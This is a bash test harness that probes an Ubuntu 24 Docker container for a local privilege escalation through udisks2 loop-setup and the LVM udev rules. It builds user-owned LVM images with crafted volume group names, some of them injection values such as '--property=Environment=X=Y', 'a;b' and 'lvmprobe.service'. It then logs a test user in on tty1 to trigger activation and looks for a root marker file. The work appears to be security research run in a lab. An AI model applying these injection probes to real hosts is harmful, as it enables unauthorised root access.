#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-lvm-udev.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

root_marker=/root/active_udisks_lvm_udev_root
tmp=/tmp/active-udisks-lvm-udev
home=/home/selfauth/active-udisks-lvm-udev
rm -rf "$tmp" "$home" "$root_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  for vg in lvmprobe_ok lvmprobe.service lvmprobe-a+b.c_d; do
    vgchange -an "$vg" >/dev/null 2>&1 || true
    vgremove -ff -y "$vg" >/dev/null 2>&1 || true
  done
  losetup -a | awk -F: '/active-udisks-lvm-udev/ {print $1}' | xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  systemctl reset-failed 'lvm-activate-*' >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

make_lvm_image() {
  local vg="$1" img="$2"
  truncate -s 64M "$img"
  local dev
  dev="$(losetup -f --show "$img")"
  pvcreate -ff -y "$dev" >/dev/null
  vgcreate "$vg" "$dev" >/dev/null
  vgchange -an "$vg" >/dev/null 2>&1 || true
  losetup -d "$dev"
}

{
  echo "## target"
  cat /etc/os-release | sed -n '1,6p'
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\n' udisks2 lvm2 systemd udev policykit-1 polkitd 2>&1 | sort
  echo

  echo "## default units/actions"
  systemctl is-enabled udisks2.service lvm2-lvmpolld.socket lvm2-monitor.service 2>&1 || true
  systemctl is-active udisks2.service lvm2-lvmpolld.socket lvm2-monitor.service 2>&1 || true
  grep -n 'loop-setup\|filesystem-mount' /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy || true
  echo

  echo "## vulnerable-looking root udev/config lines"
  nl -ba /usr/lib/udev/rules.d/69-lvm.rules | sed -n '44,90p'
  echo

  echo "## lvm name character gate"
  probe=/tmp/active-udisks-lvm-udev/name.img
  truncate -s 64M "$probe"
  dev="$(losetup -f --show "$probe")"
  pvcreate -ff -y "$dev" >/dev/null
  for name in 'bad space' 'a/b' 'a;b' 'a
b' '--property=Environment=X=Y' 'lvmprobe-a+b.c_d' 'lvmprobe.service'; do
    printf 'name_test=%q\n' "$name"
    set +e
    vgcreate "$name" "$dev" 2>&1 | sed -n '1,6p'
    rc=${PIPESTATUS[0]}
    set -e
    echo "name_test_rc=$rc"
    if [ "$rc" -eq 0 ]; then
      vgremove -ff -y "$name" >/dev/null 2>&1 || true
      pvcreate -ff -y "$dev" >/dev/null
    fi
  done
  losetup -d "$dev"
  rm -f "$probe"
  echo

  echo "## build attacker-supplied lvm image fixtures"
  make_lvm_image lvmprobe_ok "$home/lvmprobe_ok.img"
  make_lvm_image lvmprobe.service "$home/lvmprobe.service.img"
  make_lvm_image lvmprobe-a+b.c_d "$home/lvmprobe-a+b.c_d.img"
  chown -R selfauth:selfauth "$home"
  ls -l "$home"
  grep -aob 'lvmprobe' "$home"/*.img | sed -n '1,20p' || true
  systemctl reset-failed 'lvm-activate-*' >/dev/null 2>&1 || true
  rm -rf /run/lvm/pvs_online/* /run/lvm/vgs_online/* /run/lvm/pvs_lookup/* 2>/dev/null || true
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/active-udisks-lvm-udev/user.out
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
for img in /home/selfauth/active-udisks-lvm-udev/*.img; do
  echo "## loop setup $img"
  udisksctl loop-setup -f "$img" --no-user-interaction
done
sleep 5
lsblk --pairs --output NAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH | sed -n '1,220p'
SH
chmod 0755 "$home/probe.sh"
chown selfauth:selfauth "$home/probe.sh"

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-lvm-udev/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 80 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 || true

{
  cat "$tmp/root-prep.out"
  echo
  echo "## active selfauth trigger"
  cat "$tmp/user.out" 2>&1 || true
  echo
  echo "## resulting lvm/systemd state"
  pvs 2>&1 || true
  vgs 2>&1 || true
  lvs 2>&1 || true
  systemctl list-units 'lvm-activate-*' --all --no-pager 2>&1 || true
  journalctl -u 'lvm-activate-*' -n 80 --no-pager 2>&1 || true
  echo
  echo "## root marker"
  ls -l "$root_marker" /tmp/active_udisks_lvm_udev_root 2>&1 || true
  echo
  echo "## cleanup health before cleanup"
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1

cleanup_target
rm -rf "$home" "$root_marker" /tmp/active_udisks_lvm_udev_root
systemctl reset-failed 'lvm-activate-*' >/dev/null 2>&1 || true

{
  echo
  echo "## cleanup verification"
  losetup -a | grep active-udisks-lvm-udev || true
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >>"$tmp/root.out" 2>&1
EOS

docker exec "$container" cat /tmp/active-udisks-lvm-udev/root.out > "$log"
docker exec "$container" rm -rf /tmp/active-udisks-lvm-udev
sed -n '1,320p' "$log"
